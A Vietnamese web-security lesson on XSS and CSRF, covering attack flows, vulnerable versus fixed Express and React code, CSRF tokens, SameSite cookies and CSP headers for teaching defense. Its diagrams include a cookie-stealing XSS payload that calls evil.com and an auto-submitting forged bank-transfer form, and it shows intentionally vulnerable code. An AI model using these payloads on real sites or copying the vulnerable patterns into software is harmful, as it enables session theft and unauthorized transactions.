# 🌐 9.4 XSS & CSRF

> **XSS** (Cross-Site Scripting) và **CSRF** (Cross-Site Request Forgery) là 2 trong những lỗ hổng phổ biến nhất trên web. Cả hai đều khai thác trust relationship — XSS khai thác trust giữa user và website, CSRF khai thác trust giữa website và browser (cookie).

```
┌─────────────────────────────────────────────────────────┐
│        XSS vs CSRF — Phân biệt                          │
├──────────────┬──────────────────────┬────────────────────┤
│              │  XSS                 │  CSRF              │
├──────────────┼──────────────────────┼────────────────────┤
│ Mục tiêu     │ Client (trình duyệt) │ Server (user)      │
│ Cách hoạt động│ Chèn script độc vào │ Giả mạo request    │
│              │ trang web            │ từ site khác       │
│ Target       │ Đọc/bẻ khóa session  │ Thực hiện hành vi  │
│              │ cookie, data         │ thay user          │
│ Phòng chống  │ Encode output       │ CSRF token +      │
│              │ + CSP headers        │ SameSite cookie    │
│ Severity     │ CWE-79               │ CWE-352            │
│ OWASP 2021   │ A03 (Injection)     │ A01 (Access Control)│
└──────────────┴──────────────────────┴────────────────────┘
```

---

## 🎯 Phần 1: XSS (Cross-Site Scripting)

### 3 loại XSS

| Loại | Mô tả | Ví dụ thực tế | Mức độ nguy hiểm |
|------|-------|---------------|-----------------|
| **Reflected** | Script độc gửi qua URL, server phản hồi ngay | Link độc gài `<script>` vào query param | 🟡 Trung bình — cần social engineering |
| **Stored** | Script lưu vào DB, hiển thị cho mọi người | Comment độc trên forum, review độc trên sản phẩm | 🔴 Cao — mỗi người xem page đều bị attack |
| **DOM-based** | Client-side JS xử lý URL/user input unsafe | `location.hash` dùng trực tiếp làm DOM target | 🟡 Trung bình — chỉ victim click link |

```
┌─────────────────────────────────────────────────────────┐
│               XSS ATTACK FLOW                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Reflected (phản hồi ngay):                             │
│  Attacker tạo link:                                     │
│  https://shop.example.com/search?q=<script>             │
│            steal(document.cookie)</script>              │
│        ↓                                                │
│  Victim click link → Server nhận q=<script>...         │
│        ↓                                                │
│  Server phản chiếu (reflect) lại trong response HTML:          │
│  <h1>Kết quả cho: <script>steal(document.cookie)</script></h1>
│        ↓                                                │
│  Browser render → script chạy → cookie gửi về attacker  │
│                                                         │
│  Stored (lưu persistent):                               │
│  Attacker gửi comment:                                  │
│  <img src=x onerror="fetch('https://evil.com/'+document.cookie)">
│        ↓                                                │
│  Comment được lưu vào DB                                │
│        ↓                                                │
│  User khác mở trang → render comment → script chạy     │
│        ↓                                                │
│  Cookie của user bị đánh cắp                            │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 💻 Code ví dụ — Bad vs Good

```typescript
import express from 'express';
import escapeHtml from 'escape-html';

const app = express();

// ❌ BAD — Render raw HTML từ user input (Reflected XSS)
app.get('/search', (req, res) => {
  const query = req.query.q as string;
  // User nhập: <script>alert(document.cookie)</script>
  res.send(`<h1>Kết quả cho: ${query}</h1>`);
  // Browser sẽ thực thi script này!
});

// ✅ GOOD — Escape HTML trước khi render
app.get('/search-safe', (req, res) => {
  const query = req.query.q as string;
  const safeQuery = escapeHtml(query);  // < → &lt;, > → &gt;, & → &amp;
  res.send(`<h1>Kết quả cho: ${safeQuery}</h1>`);
  // Browser hiển thị text, không thực thi
});
```

### DOM-based XSS — React example

```typescript
// ❌ BAD — dangerouslySetInnerHTML không sanitize
function SearchResults({ userInput }: { userInput: string }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}

// ✅ GOOD — React tự escape text (safe by default)
function SearchResultsSafe({ userInput }: { userInput: string }) {
  return <div>{userInput}</div>;  // React tự escape → safe
}

// ✅ GOOD — Nếu bắt buộc render HTML, dùng sanitizer
import DOMPurify from 'dompurify';

function SearchResultsSanitized({ userInput }: { userInput: string }) {
  const sanitized = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'a'],  // Chỉ cho phép tags an toàn
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### 🛡️ XSS Defense checklist

```
□ Escape/T encode output theo context (HTML, JS, URL, HTML attribute)
□ Dùng framework auto-escape (React, Vue, Angular mặc định escape)
□ Thiết lập CSP header (Content-Security-Policy)
□ Validate input (whitelist, reject dangerous patterns)
□ Không dùng innerHTML, document.write, eval()
□ Sanitize rich text input (DOMPurify cho editor)
□ HttpOnly + Secure cookies (xss không đọc được cookie)
□ Content-Type: application/json cho API responses (không text/html)
```

---

## 🎯 Phần 2: CSRF (Cross-Site Request Forgery)

### Cơ chế tấn công

CSRF khai thác việc browser tự động gửi cookie với mọi request đến cùng domain. Attacker tạo trang độc gửi request đến target site — browser gửi kèm cookie auth.

```
┌──────────────────────────────────────────────────────────┐
│                 CSRF FLOW                                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. User đã đăng nhập vào bank.com (có session cookie)   │
│     Cookie: sessionId=abc123 (browser lưu tự động)        │
│                                                          │
│  2. User mở evil.com (trang attacker tạo)                │
│     evil.com chứa ẩn form + auto-submit:                 │
│                                                          │
│     <form action="https://bank.com/transfer" method="POST">│
│       <input name="amount" value="10000">                 │
│       <input name="to" value="attacker-account">          │
│     </form>                                              │
│     <script>                                              │
│       document.forms[0].submit();  // auto-submit!       │
│     </script>                                            │
│                                                          │
│  3. Browser gửi request KÈM cookie sessionId=abc123      │
│     → Bank.com tin là user đang gửi request hợp lệ!       │
│     → 10,000 USD chuyển vào tài khoản attacker!           │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**Điều kiện để CSRF thành công:**
1. User đã có session hợp lệ (cookie tồn tại)
2. Action nhạy cảm không yêu cầu token đặc biệt
3. Request không kiểmOrigin header (hoặc kiểm Origin không đủ)

### 🛡️ Phòng chống CSRF

| Phương pháp | Mức độ | Cách hoạt động | Hạn chế |
|-------------|--------|----------------|---------|
| **SameSite Cookie** | ✅ Recommended | Browser không gửi cookie cross-site | Không protect GET requests, legacy browser |
| **CSRF Token** | ✅ Recommended | Token ngẫu nhiên trong form + header, server verify | Cần sync token giữa form và request |
| **Custom Header** | ✅ Good | `X-Requested-With: XMLHttpRequest` — attcker site không set được | SPA friendly, nhưng không protect form POST |
| **Double Submit Cookie** | ✅ Good | Token gửi 2 nơi (cookie + header), server so sánh | Đơn giản hơn CSRF token |
| **Check Origin/Referer** | ⚠️ Supplementary | Server kiểm tra header Origin | Có thể bypass qua header manipulation |

```typescript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

const csrfProtection = csrf({ cookie: true });

// ✅ GOOD — CSRF token protection middleware
app.use(cookieParser());
app.use(csrfProtection);

// Endpoint lấy CSRF token cho frontend
app.get('/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected mutation endpoint
app.post('/transfer', csrfProtection, (req, res) => {
  // req.csrfToken() đã được xác thực tự động
  const { amount, to } = req.body;
  // execute transfer...
  res.json({ success: true, transferId: generateId() });
});
```

```typescript
// Frontend: đọc token từ cookie và gửi cùng request
// ❌ BAD — Không có CSRF token
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ amount: 1000, to: 'attacker' }),
  credentials: 'include',  // gửi cookie
});

// ✅ GOOD — Gửi CSRF token từ cookie vào custom header
async function transfer(amount: number, to: string) {
  // Đọc CSRF token từ cookie
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('CSRF-TOKEN='))
    ?.split('=')[1];

  const res = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-csrf-token': csrfToken!,   // Attacker site không đọc được cookie httpOnly
    },
    credentials: 'include',
    body: JSON.stringify({ amount, to }),
  });
  return res.json();
}
```

### SameSite Cookie — tuyến phòng thủ quan trọng nhất

```typescript
// Set cookie với SameSite=Strict
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',   // Browser KHÔNG gửi cookie cross-site
  maxAge: 15 * 60 * 1000,
});

// SameSite values:
// 'strict'  → Cookie KHÔNG bao giờ gửi cross-site (strongest)
// 'lax'     → Cookie gửi khi top-level navigation (GET only)
// 'none'    → Cookie gửi cross-site (cần secure=true)
```

---

## 🔒 CSP (Content Security Policy)

CSP giúp giảm thiểu XSS bằng cách chặn script không thuộc nguồn tin cậy. Là "final layer" khi encode/sanitize không đủ.

```typescript
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],                    // Fallback: chỉ same-origin
      scriptSrc: ["'self'", 'https://cdn.example.com'],
      styleSrc: ["'self'", 'https://fonts.googleapis.com'],
      imgSrc: ["'self'", 'data:', 'https://images.example.com'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],                     // Cấm <object>
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],                      // Cấm iframe
      upgradeInsecureRequests: [],               // Tự động upgrade HTTP → HTTPS
      blockAllMixedContent: true,
    },
  })
);
```

```
┌─────────────────────────────────────────────────────────┐
│            CSP DIRECTIVES REFERENCE                     │
├──────────────────┬──────────────────────────────────────┤
│ default-src      │ Fallback khi không có directive khác │
│ script-src       │ Nơi load JavaScript                  │
│ style-src        │ Nơi load CSS                         │
│ img-src          │ Nơi load hình ảnh                    │
│ connect-src      │ Nơi fetch/xhr đến                    │
│ font-src         │ Nơi load font                        │
│ object-src       │ Nơi load <object>/<embed>            │
│ media-src        │ Nơi load <audio>, <video>            │
│ frame-src        │ Nơi load iframe                      │
│ child-src        │ Workers, nested iframes              │
│ base-uri         │ Giới hạn <base> URL                  │
│ form-action      │ Giới hạn <form> action               │
│ frame-ancestors  │ Trang nào có thể embed mình          │
│ upgrade-insecure │ Tự động upgrade HTTP→HTTPS           │
│ block-all-mixed  │ Chặn mixed content (HTTP+HTTPS)      │
└──────────────────┴──────────────────────────────────────┘
```

### Inline Script & nonce/hash

```html
<!-- Server set nonce trong CSP header -->
Content-Security-Policy: script-src 'self' 'nonce-abc123xyz'

<!-- Client dùng cùng nonce -->
<script nonce="abc123xyz">
  console.log('inline script OK — server đã approve');
</script>

<script>
  console.log('inline script BLOCKED — không có nonce');
</script>
```

```typescript
// Express + helmet với nonce động per-request
import crypto from 'crypto';

app.use((req, res, next) => {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  res.locals.cspNonce = nonce;
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      scriptSrc: ["'self'", ({ nonce }) => `'nonce-${nonce.value}'`],
    },
  })
);
```

---

## ✅ Checklist phòng chống tổng hợp

| # | Biện pháp | Chống lại | Implementation |
|---|-----------|-----------|----------------|
| 1 | Escape/encode output theo context | XSS | `escape-html`, DOMPurify |
| 2 | Input validation (whitelist) | XSS, Injection | Zod, Joi, Yup |
| 3 | CSP headers | XSS | Helmet CSP config |
| 4 | CSRF token trên mọi form mutation | CSRF | csurf, double-submit cookie |
| 5 | SameSite=Strict/Lax cookie | CSRF | `res.cookie(..., { sameSite: 'strict' })` |
| 6 | HttpOnly cookie | XSS đọc cookie | `httpOnly: true` |
| 7 | Không dùng `eval()` hay `new Function()` | XSS | Linter rule, static analysis |
| 8 | Content-Type: application/json | XSS (mime sniff) | Response header |
| 9 | Framework auto-escape (React/Vue) | XSS | Default behavior |
| 10 | Monitor CSP violations | XSS detection | `report-uri` hoặc `report-to` directive |

---

## 📚 Tài liệu tham khảo

- 📖 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 📖 [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- 📖 [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- 📖 [CSP Quick Reference](https://content-security-policy.com/)

---

## ▶️ Chạy ví dụ

```bash
cd 09-security/9.4-xss-csrf
npx ts-node examples/index.ts
```

---

⏭️ Bài tiếp theo → [9.5 Encryption](../9.5-encryption/README.md)
